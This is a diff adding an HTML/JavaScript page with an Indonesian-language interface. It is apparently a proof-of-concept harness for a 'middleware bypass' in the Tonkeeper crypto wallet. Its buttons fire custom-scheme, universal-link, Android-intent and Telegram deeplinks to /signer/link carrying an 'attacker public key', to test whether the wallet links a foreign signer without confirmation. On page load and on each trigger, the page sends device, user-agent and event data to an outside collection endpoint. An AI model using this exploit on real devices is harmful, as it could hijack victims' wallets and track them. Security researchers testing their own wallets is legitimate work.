@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tonkeeper Deeplink Middleware Bypass — Mobile Test</title>
+    <style>
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 16px;
+            background: #0d1117;
+            color: #c9d1d9;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        h1 { color: #58a6ff; font-size: 18px; margin-bottom: 4px; }
+        .subtitle { color: #8b949e; font-size: 12px; margin-bottom: 16px; }
+        .card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+        .card h2 { color: #d29922; font-size: 14px; margin: 0 0 12px 0; }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            border-bottom: 1px solid #21262d;
+            font-size: 13px;
+        }
+        .info-row:last-child { border-bottom: none; }
+        .info-label { color: #8b949e; }
+        .info-value { color: #c9d1d9; font-family: monospace; font-size: 12px; word-break: break-all; text-align: right; max-width: 60%; }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            background: #238636;
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 8px;
+            text-align: center;
+            text-decoration: none;
+        }
+        .btn:active { opacity: 0.8; }
+        .btn-danger { background: #da3633; }
+        .btn-secondary { background: #21262d; border: 1px solid #30363d; color: #c9d1d9; }
+        .btn-warning { background: #9e6a03; }
+        #log {
+            background: #0d1117;
+            border: 1px solid #21262d;
+            border-radius: 6px;
+            padding: 10px;
+            max-height: 250px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 11px;
+            line-height: 1.4;
+        }
+        .log-entry { padding: 2px 0; border-bottom: 1px solid #161b22; }
+        .log-entry.error { color: #f85149; }
+        .log-entry.success { color: #3fb950; }
+        .log-entry.warn { color: #d29922; }
+        .log-entry.info { color: #58a6ff; }
+        .payload-box {
+            background: #0d1117;
+            border: 1px solid #21262d;
+            border-radius: 6px;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 11px;
+            word-break: break-all;
+            color: #79c0ff;
+            margin: 8px 0;
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .status-badge.ready { background: #1f6feb; color: white; }
+        .status-badge.waiting { background: #9e6a03; color: white; }
+        .status-badge.done { background: #238636; color: white; }
+        .note { color: #8b949e; font-size: 11px; margin-top: 8px; }
+        .warn-box {
+            background: #2d1b00;
+            border: 1px solid #9e6a03;
+            border-radius: 6px;
+            padding: 10px;
+            color: #d29922;
+            font-size: 12px;
+            margin-bottom: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>🔴 Tonkeeper Deeplink Bypass Test</h1>
+<p class="subtitle">Middleware bypass via <code>/signer/link</code> — Mobile mode</p>
+
+<div class="warn-box">
+    ⚠️ <b>Test ini hanya untuk wallet milik Anda sendiri.</b> Jangan gunakan pada device orang lain tanpa izin. Semua data yang dikirim adalah metadata test, bukan private key.
+</div>
+
+<!-- Device Info -->
+<div class="card">
+    <h2>📱 Device Info</h2>
+    <div class="info-row">
+        <span class="info-label">Platform</span>
+        <span class="info-value" id="platform">-</span>
+    </div>
+    <div class="info-row">
+        <span class="info-label">User Agent</span>
+        <span class="info-value" id="ua" style="max-width: 70%; font-size: 10px;">-</span>
+    </div>
+    <div class="info-row">
+        <span class="info-label">Is TMA</span>
+        <span class="info-value" id="is-tma">-</span>
+    </div>
+    <div class="info-row">
+        <span class="info-label">Tonkeeper Installed</span>
+        <span class="info-value" id="tk-installed">Checking...</span>
+    </div>
+</div>
+
+<!-- Config -->
+<div class="card">
+    <h2>⚙️ Test Configuration</h2>
+    <label style="font-size: 12px; color: #8b949e;">Attacker Public Key (hex, 64 chars)</label>
+    <input type="text" id="pk" 
+           value="deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
+           style="width: 100%; padding: 10px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #58a6ff; font-family: monospace; font-size: 12px; margin: 6px 0 12px 0; box-sizing: border-box;">
+    
+    <label style="font-size: 12px; color: #8b949e;">Key Name</label>
+    <input type="text" id="keyname" value="test-key"
+           style="width: 100%; padding: 10px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #58a6ff; font-family: monospace; font-size: 12px; margin: 6px 0 12px 0; box-sizing: border-box;">
+
+    <label style="font-size: 12px; color: #8b949e;">Endpoint (hasil test)</label>
+    <input type="text" id="endpoint" 
+           value="https://ckytrx0m.instances.httpworkbench.com/"
+           style="width: 100%; padding: 10px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #58a6ff; font-family: monospace; font-size: 11px; margin: 6px 0 0 0; box-sizing: border-box;">
+</div>
+
+<!-- Trigger Buttons -->
+<div class="card">
+    <h2>🚀 Trigger Deeplink</h2>
+    <p style="font-size: 12px; color: #8b949e; margin: 0 0 12px 0;">
+        Klik tombol di bawah untuk memicu deeplink <code>/signer/link</code>. 
+        Tonkeeper akan terbuka. <b>Amati:</b> apakah muncul konfirmasi? Apakah key ditambahkan?
+    </p>
+    
+    <button class="btn" onclick="triggerCustomScheme()">
+        ▶ Trigger Custom Scheme<br>
+        <span style="font-size: 11px; opacity: 0.7;">tonkeeper://signer/link?pk=...&name=...</span>
+    </button>
+
+    <button class="btn btn-warning" onclick="triggerUniversalLink()">
+        ▶ Trigger Universal Link (iOS)<br>
+        <span style="font-size: 11px; opacity: 0.7;">https://app.tonkeeper.com/signer/link?pk=...</span>
+    </button>
+
+    <button class="btn btn-danger" onclick="triggerAndroidIntent()">
+        ▶ Trigger Android Intent<br>
+        <span style="font-size: 11px; opacity: 0.7;">intent://signer/link?pk=...#Intent;scheme=tonkeeper;end</span>
+    </button>
+
+    <button class="btn btn-secondary" onclick="triggerTMA()">
+        ▶ Trigger via TMA (tonkeeper-tc://)<br>
+        <span style="font-size: 11px; opacity: 0.7;">tonkeeper-tc://signer/link?pk=...</span>
+    </button>
+</div>
+
+<!-- Payload Preview -->
+<div class="card">
+    <h2>📋 Payload Preview</h2>
+    <div class="payload-box" id="payload-preview">-</div>
+    <button class="btn btn-secondary" onclick="updatePreview()">Refresh Preview</button>
+</div>
+
+<!-- Results -->
+<div class="card">
+    <h2>📊 Results <span class="status-badge waiting" id="result-status">Waiting</span></h2>
+    <div id="log"></div>
+    <button class="btn btn-secondary" onclick="clearLog()">Clear Log</button>
+</div>
+
+<script>
+// ============================================
+// STATE
+// ============================================
+let testLog = [];
+let tonkeeperDetected = null;
+
+// ============================================
+// LOGGING
+// ============================================
+function log(msg, type = 'info') {
+    const entry = {
+        ts: new Date().toISOString(),
+        msg,
+        type
+    };
+    testLog.push(entry);
+    
+    const logEl = document.getElementById('log');
+    const div = document.createElement('div');
+    div.className = `log-entry ${type}`;
+    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logEl.prepend(div);
+    
+    console.log(msg);
+}
+
+function clearLog() {
+    testLog = [];
+    document.getElementById('log').innerHTML = '';
+    document.getElementById('result-status').className = 'status-badge waiting';
+    document.getElementById('result-status').textContent = 'Waiting';
+}
+
+// ============================================
+// SEND TO ENDPOINT
+// ============================================
+async function sendToEndpoint(data) {
+    const endpoint = document.getElementById('endpoint').value;
+    const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+    const url = endpoint + '?data=' + encoded;
+    
+    try {
+        await fetch(url, { mode: 'no-cors' });
+        log(`✅ Hasil dikirim (${encoded.length} bytes)`, 'success');
+    } catch (e) {
+        log(`❌ Gagal kirim: ${e.message}`, 'error');
+    }
+}
+
+// ============================================
+// DETECT PLATFORM
+// ============================================
+function detectPlatform() {
+    const ua = navigator.userAgent;
+    let platform = 'Unknown';
+    
+    if (/android/i.test(ua)) platform = 'Android';
+    else if (/iphone|ipad|ipod/i.test(ua)) platform = 'iOS';
+    else if (/windows/i.test(ua)) platform = 'Windows';
+    else if (/mac/i.test(ua)) platform = 'macOS';
+    else if (/linux/i.test(ua)) platform = 'Linux';
+    
+    const isTMA = /Telegram/i.test(ua) || !!window.Telegram?.WebApp;
+    
+    document.getElementById('platform').textContent = platform;
+    document.getElementById('ua').textContent = ua;
+    document.getElementById('is-tma').textContent = isTMA ? '✅ Ya' : '❌ Tidak';
+    
+    return { platform, isTMA };
+}
+
+// ============================================
+// DETECT TONKEEPER INSTALLED
+// ============================================
+function detectTonkeeper() {
+    const { platform } = detectPlatform();
+    
+    if (platform === 'Android') {
+        // Coba intent scheme — jika app installed, tidak ada error
+        const testLink = document.createElement('a');
+        testLink.href = 'intent://scan/#Intent;scheme=tonkeeper;package=com.tonapps.wallet;end';
+        testLink.style.display = 'none';
+        document.body.appendChild(testLink);
+        
+        // Deteksi via visibility change
+        let hidden = false;
+        const onVisibilityChange = () => {
+            if (document.hidden) {
+                hidden = true;
+                tonkeeperDetected = true;
+                document.getElementById('tk-installed').textContent = '✅ Terinstall';
+                log('Tonkeeper terdeteksi (Android)', 'success');
+                document.removeEventListener('visibilitychange', onVisibilityChange);
+            }
+        };
+        document.addEventListener('visibilitychange', onVisibilityChange);
+        
+        setTimeout(() => {
+            if (!hidden) {
+                document.getElementById('tk-installed').textContent = '❓ Tidak diketahui';
+                log('Tonkeeper tidak terdeteksi dalam 2 detik', 'warn');
+            }
+        }, 2000);
+        
+    } else if (platform === 'iOS') {
+        // iOS: cek via universal link
+        document.getElementById('tk-installed').textContent = '❓ Cek manual';
+        log('iOS: deteksi otomatis tidak reliable, cek manual', 'info');
+    } else {
+        document.getElementById('tk-installed').textContent = '❌ Tidak di mobile';
+    }
+}
+
+// ============================================
+// BUILD DEEPLINK PAYLOADS
+// ============================================
+function buildCustomScheme() {
+    const pk = document.getElementById('pk').value.trim();
+    const name = document.getElementById('keyname').value.trim();
+    return `tonkeeper://signer/link?pk=${pk}&name=${name}`;
+}
+
+function buildUniversalLink() {
+    const pk = document.getElementById('pk').value.trim();
+    const name = document.getElementById('keyname').value.trim();
+    return `https://app.tonkeeper.com/signer/link?pk=${pk}&name=${name}`;
+}
+
+function buildAndroidIntent() {
+    const pk = document.getElementById('pk').value.trim();
+    const name = document.getElementById('keyname').value.trim();
+    return `intent://signer/link?pk=${pk}&name=${name}#Intent;scheme=tonkeeper;package=com.tonapps.wallet;end`;
+}
+
+function buildTMA() {
+    const pk = document.getElementById('pk').value.trim();
+    const name = document.getElementById('keyname').value.trim();
+    return `tonkeeper-tc://signer/link?pk=${pk}&name=${name}`;
+}
+
+function updatePreview() {
+    const payloads = {
+        customScheme: buildCustomScheme(),
+        universalLink: buildUniversalLink(),
+        androidIntent: buildAndroidIntent(),
+        tma: buildTMA()
+    };
+    
+    document.getElementById('payload-preview').innerHTML = 
+        Object.entries(payloads).map(([k, v]) => 
+            `<b>${k}:</b><br>${v}<br><br>`
+        ).join('');
+}
+
+// ============================================
+// TRIGGER FUNCTIONS
+// ============================================
+function recordTrigger(method, url) {
+    const data = {
+        test: 'deeplink_trigger',
+        method,
+        url,
+        platform: detectPlatform().platform,
+        isTMA: detectPlatform().isTMA,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+    };
+    
+    log(`Trigger ${method}: ${url.substring(0, 80)}...`, 'info');
+    sendToEndpoint(data);
+    
+    // Set status
+    document.getElementById('result-status').className = 'status-badge done';
+    document.getElementById('result-status').textContent = 'Triggered';
+}
+
+function triggerCustomScheme() {
+    const url = buildCustomScheme();
+    recordTrigger('custom_scheme', url);
+    
+    // Trigger via iframe (lebih reliable di beberapa browser)
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = url;
+    document.body.appendChild(iframe);
+    
+    // Fallback via location.href
+    setTimeout(() => {
+        window.location.href = url;
+    }, 100);
+    
+    log('Custom scheme triggered. Amati apakah Tonkeeper terbuka.', 'warn');
+}
+
+function triggerUniversalLink() {
+    const url = buildUniversalLink();
+    recordTrigger('universal_link', url);
+    
+    // Universal link — harus via user gesture
+    window.location.href = url;
+    
+    log('Universal link triggered. Amati apakah Tonkeeper terbuka.', 'warn');
+}
+
+function triggerAndroidIntent() {
+    const url = buildAndroidIntent();
+    recordTrigger('android_intent', url);
+    
+    window.location.href = url;
+    
+    log('Android intent triggered. Amati apakah Tonkeeper terbuka.', 'warn');
+}
+
+function triggerTMA() {
+    const url = buildTMA();
+    recordTrigger('tma_scheme', url);
+    
+    window.location.href = url;
+    
+    log('TMA scheme triggered. Amati apakah Tonkeeper terbuka.', 'warn');
+}
+
+// ============================================
+// OBSERVE APP OPEN (visibility change)
+// ============================================
+document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+        log('📱 Halaman tersembunyi — Tonkeeper mungkin terbuka', 'success');
+        sendToEndpoint({
+            test: 'app_opened',
+            timestamp: new Date().toISOString(),
+            hidden: true
+        });
+    } else {
+        log('👁️ Halaman kembali terlihat', 'info');
+        sendToEndpoint({
+            test: 'app_returned',
+            timestamp: new Date().toISOString(),
+            hidden: false
+        });
+    }
+});
+
+// ============================================
+// INIT
+// ============================================
+window.addEventListener('DOMContentLoaded', () => {
+    const { platform, isTMA } = detectPlatform();
+    log(`Platform: ${platform}, TMA: ${isTMA}`, 'info');
+    
+    updatePreview();
+    detectTonkeeper();
+    
+    // Kirim device info
+    sendToEndpoint({
+        test: 'device_info',
+        platform,
+        isTMA,
+        userAgent: navigator.userAgent,
+        screen: `${screen.width}x${screen.height}`,
+        timestamp: new Date().toISOString()
+    });
+    
+    log('Test harness siap. Klik tombol trigger.', 'success');
+});
+</script>
+
+</body>
+</html>
